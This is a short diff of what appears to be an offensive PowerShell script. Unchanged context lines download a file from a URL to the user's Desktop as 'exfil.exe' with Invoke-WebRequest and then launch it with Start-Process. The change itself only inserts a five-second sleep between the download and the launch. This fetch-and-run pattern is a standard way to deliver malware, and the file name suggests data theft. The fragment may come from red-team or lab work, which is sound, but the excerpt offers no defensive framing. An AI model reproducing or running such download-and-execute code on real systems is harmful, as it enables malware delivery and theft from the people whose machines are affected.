@@ -16,6 +16,8 @@ if (Test-Path -Path $Folder) {
     $ExfilPath = $HOME + '/Desktop/exfil.exe'
     "Grabbing file"
     Invoke-WebRequest -URI $URL -OutFile $ExfilPath
+    "Wait 5 seconds"
+    Start-Sleep -Seconds 5
     "Running file"
     Start-Process -FilePath $ExfilPath
   } else {
